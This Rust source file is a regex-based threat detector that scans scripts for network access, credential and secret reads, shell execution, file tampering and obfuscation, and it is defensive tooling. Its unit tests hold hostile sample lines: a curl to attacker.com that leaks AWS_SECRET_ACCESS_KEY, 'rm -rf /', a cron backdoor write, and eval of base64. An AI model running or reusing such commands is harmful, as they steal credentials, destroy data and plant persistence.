use regex::Regex;
use lazy_static::lazy_static;

#[derive(Debug, Clone)]
pub enum ThreatIndicator {
    NetworkActivity(NetworkPattern),
    DataExfiltration(ExfiltrationVector),
    ProcessExecution(ExecutionContext),
    FileSystemTampering(FSOperation),
    Obfuscation(ObfuscationTechnique),
}

#[derive(Debug, Clone)]
pub struct NetworkPattern {
    pub pattern_type: String,
    pub evidence: String,
    pub risk_weight: u8,
}

#[derive(Debug, Clone)]
pub struct ExfiltrationVector {
    pub target: String,
    pub evidence: String,
    pub risk_weight: u8,
}

#[derive(Debug, Clone)]
pub struct ExecutionContext {
    pub method: String,
    pub evidence: String,
    pub risk_weight: u8,
}

#[derive(Debug, Clone)]
pub struct FSOperation {
    pub operation: String,
    pub evidence: String,
    pub risk_weight: u8,
}

#[derive(Debug, Clone)]
pub struct ObfuscationTechnique {
    pub technique: String,
    pub evidence: String,
    pub risk_weight: u8,
}

lazy_static! {
    // Network activity patterns
    static ref NETWORK_PATTERNS: Vec<(Regex, &'static str, u8)> = vec![
        (Regex::new(r#"\brequire\s*\(\s*['"](https?|net|axios|node-fetch|got|request)['"]\s*\)"#).unwrap(), "HTTP client import", 15),
        (Regex::new(r"\bfetch\s*\(").unwrap(), "fetch() call", 15),
        (Regex::new(r#"https?://[^\s'""]+"#).unwrap(), "Hardcoded URL", 20),
        (Regex::new(r"\b(XMLHttpRequest|WebSocket)\b").unwrap(), "Network API usage", 15),
        (Regex::new(r"\bdns\.(lookup|resolve)").unwrap(), "DNS query", 10),
    ];

    // Data exfiltration patterns
    static ref EXFILTRATION_PATTERNS: Vec<(Regex, &'static str, u8)> = vec![
        (Regex::new(r"\bprocess\.env\b").unwrap(), "Environment variable access", 10),
        (Regex::new(r"\b(AWS_|GITHUB_|NPM_|DOCKER_|CI_|GITLAB_)[A-Z_]+").unwrap(), "Sensitive env var", 25),
        (Regex::new(r"(\.ssh|\.aws|\.npmrc|\.docker|\.kube)").unwrap(), "Sensitive file path", 30),
        (Regex::new(r"\bfs\.readFile.*?(token|secret|key|password|credential)").unwrap(), "Reading secrets", 35),
        (Regex::new(r"\bos\.(homedir|userInfo|hostname)").unwrap(), "System info collection", 10),
    ];

    // Process execution patterns
    static ref EXECUTION_PATTERNS: Vec<(Regex, &'static str, u8)> = vec![
        (Regex::new(r"\bchild_process\.(exec|execSync|spawn|fork)").unwrap(), "Child process execution", 20),
        (Regex::new(r#"\brequire\s*\(\s*['"]child_process['"]\s*\)"#).unwrap(), "Child process import", 15),
        (Regex::new(r"\b(sh|bash|cmd|powershell|/bin/)").unwrap(), "Shell execution", 25),
        (Regex::new(r"\beval\s*\(").unwrap(), "eval() usage", 30),
        (Regex::new(r"\bFunction\s*\(").unwrap(), "Function constructor", 25),
    ];

    // File system tampering patterns
    static ref FS_PATTERNS: Vec<(Regex, &'static str, u8)> = vec![
        (Regex::new(r"\bfs\.(writeFile|appendFile|mkdir|rmdir|unlink)").unwrap(), "File system write", 15),
        (Regex::new(r"\.\./").unwrap(), "Directory traversal", 20),
        (Regex::new(r"\b(package\.json|package-lock\.json|yarn\.lock)").unwrap(), "Lockfile modification", 30),
        (Regex::new(r"\.git/").unwrap(), "Git directory access", 25),
        (Regex::new(r"/etc/|/usr/|/var/|C:\\Windows").unwrap(), "System directory access", 35),
    ];

    // Obfuscation patterns
    static ref OBFUSCATION_PATTERNS: Vec<(Regex, &'static str, u8)> = vec![
        (Regex::new(r"\batob\s*\(").unwrap(), "Base64 decode", 20),
        (Regex::new(r"String\.fromCharCode").unwrap(), "Character code obfuscation", 25),
        (Regex::new(r"\\x[0-9a-fA-F]{2}").unwrap(), "Hex encoding", 15),
        (Regex::new(r"\\u[0-9a-fA-F]{4}").unwrap(), "Unicode escape", 10),
        (Regex::new(r"\[(0x[0-9a-fA-F]+,?\s*){10,}\]").unwrap(), "Hex array obfuscation", 30),
        (Regex::new(r#"['"]\s*\+\s*['"]"#).unwrap(), "String concatenation obfuscation", 5),
    ];
}

pub struct ThreatDetector;

impl ThreatDetector {
    pub fn detect_threats(script: &str) -> Vec<ThreatIndicator> {
        let mut threats = Vec::new();

        // Detect network activity
        for (pattern, description, weight) in NETWORK_PATTERNS.iter() {
            for capture in pattern.find_iter(script) {
                threats.push(ThreatIndicator::NetworkActivity(NetworkPattern {
                    pattern_type: description.to_string(),
                    evidence: capture.as_str().to_string(),
                    risk_weight: *weight,
                }));
            }
        }

        // Detect data exfiltration
        for (pattern, description, weight) in EXFILTRATION_PATTERNS.iter() {
            for capture in pattern.find_iter(script) {
                threats.push(ThreatIndicator::DataExfiltration(ExfiltrationVector {
                    target: description.to_string(),
                    evidence: capture.as_str().to_string(),
                    risk_weight: *weight,
                }));
            }
        }

        // Detect process execution
        for (pattern, description, weight) in EXECUTION_PATTERNS.iter() {
            for capture in pattern.find_iter(script) {
                threats.push(ThreatIndicator::ProcessExecution(ExecutionContext {
                    method: description.to_string(),
                    evidence: capture.as_str().to_string(),
                    risk_weight: *weight,
                }));
            }
        }

        // Detect file system tampering
        for (pattern, description, weight) in FS_PATTERNS.iter() {
            for capture in pattern.find_iter(script) {
                threats.push(ThreatIndicator::FileSystemTampering(FSOperation {
                    operation: description.to_string(),
                    evidence: capture.as_str().to_string(),
                    risk_weight: *weight,
                }));
            }
        }

        // Detect obfuscation
        for (pattern, description, weight) in OBFUSCATION_PATTERNS.iter() {
            for capture in pattern.find_iter(script) {
                threats.push(ThreatIndicator::Obfuscation(ObfuscationTechnique {
                    technique: description.to_string(),
                    evidence: capture.as_str().to_string(),
                    risk_weight: *weight,
                }));
            }
        }

        threats
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_network_detection() {
        let script = r#"const https = require('https'); fetch('https://evil.com');"#;
        let threats = ThreatDetector::detect_threats(script);
        assert!(threats.len() >= 2);
    }

    #[test]
    fn test_exfiltration_detection() {
        let script = r#"const token = process.env.GITHUB_TOKEN;"#;
        let threats = ThreatDetector::detect_threats(script);
        assert!(threats.iter().any(|t| matches!(t, ThreatIndicator::DataExfiltration(_))));
    }

    #[test]
    fn test_execution_detection() {
        let script = r#"require('child_process').exec('rm -rf /');"#;
        let threats = ThreatDetector::detect_threats(script);
        assert!(threats.iter().any(|t| matches!(t, ThreatIndicator::ProcessExecution(_))));
    }

    #[test]
    fn test_fs_tampering_detection() {
        let script = r#"fs.writeFile('/etc/cron.d/backdoor', payload)"#;
        let threats = ThreatDetector::detect_threats(script);
        assert!(threats.iter().any(|t| matches!(t, ThreatIndicator::FileSystemTampering(_))));
    }

    #[test]
    fn test_obfuscation_detection() {
        let script = r#"eval(atob('aGVsbG8='))"#;
        let threats = ThreatDetector::detect_threats(script);
        assert!(threats.iter().any(|t| matches!(t, ThreatIndicator::Obfuscation(_))));
        assert!(threats.iter().any(|t| matches!(t, ThreatIndicator::ProcessExecution(_))));
    }

    #[test]
    fn test_no_threats_on_clean_script() {
        let script = "echo 'build complete'";
        let threats = ThreatDetector::detect_threats(script);
        assert!(threats.is_empty());
    }

    #[test]
    fn test_all_categories_detected() {
        // One indicator per category in a single script
        let script = r#"
            const cp = require('child_process');
            cp.exec('curl https://attacker.com/?k=' + process.env.AWS_SECRET_ACCESS_KEY);
            require('fs').writeFile('../stolen', data);
            eval(atob('cGF5bG9hZA=='));
        "#;
        let threats = ThreatDetector::detect_threats(script);
        let has_network  = threats.iter().any(|t| matches!(t, ThreatIndicator::NetworkActivity(_)));
        let has_exfil    = threats.iter().any(|t| matches!(t, ThreatIndicator::DataExfiltration(_)));
        let has_exec     = threats.iter().any(|t| matches!(t, ThreatIndicator::ProcessExecution(_)));
        let has_fs       = threats.iter().any(|t| matches!(t, ThreatIndicator::FileSystemTampering(_)));
        let has_obfusc   = threats.iter().any(|t| matches!(t, ThreatIndicator::Obfuscation(_)));
        assert!(has_network,  "should detect network activity");
        assert!(has_exfil,    "should detect data exfiltration");
        assert!(has_exec,     "should detect process execution");
        assert!(has_fs,       "should detect file system tampering");
        assert!(has_obfusc,   "should detect obfuscation");
    }

    #[test]
    fn test_multiple_matches_same_pattern() {
        // Two fetch calls and two hardcoded URLs → at least 4 NetworkActivity hits
        let script = r#"fetch('https://a.com/log'); fetch('https://b.com/log');"#;
        let threats = ThreatDetector::detect_threats(script);
        let network_count = threats.iter()
            .filter(|t| matches!(t, ThreatIndicator::NetworkActivity(_)))
            .count();
        assert!(network_count >= 4, "expected >= 4, got {}", network_count);
    }

    #[test]
    fn test_git_directory_access_flagged() {
        let script = r#"fs.readFile('.git/config', 'utf8', cb)"#;
        let threats = ThreatDetector::detect_threats(script);
        assert!(threats.iter().any(|t| matches!(t, ThreatIndicator::FileSystemTampering(_))));
    }

    #[test]
    fn test_hex_array_obfuscation() {
        // 11 hex values — exceeds the ≥10 threshold in the pattern
        let script = "var p = [0x68,0x65,0x6c,0x6c,0x6f,0x20,0x77,0x6f,0x72,0x6c,0x64];";
        let threats = ThreatDetector::detect_threats(script);
        assert!(threats.iter().any(|t| matches!(t, ThreatIndicator::Obfuscation(_))));
    }

    #[test]
    fn test_sensitive_env_vars_detected() {
        for var in &["AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "NPM_TOKEN", "DOCKER_PASSWORD"] {
            let script = format!("process.env.{}", var);
            let threats = ThreatDetector::detect_threats(&script);
            assert!(
                threats.iter().any(|t| matches!(t, ThreatIndicator::DataExfiltration(_))),
                "{} should be flagged as exfiltration",
                var
            );
        }
    }

    #[test]
    fn test_ssh_and_aws_credential_paths() {
        for path in &[".ssh/id_rsa", ".aws/credentials", ".npmrc", ".kube/config"] {
            let script = format!("fs.readFile('{}', cb)", path);
            let threats = ThreatDetector::detect_threats(&script);
            assert!(
                threats.iter().any(|t| matches!(t, ThreatIndicator::DataExfiltration(_))),
                "{} should be flagged as exfiltration",
                path
            );
        }
    }
}
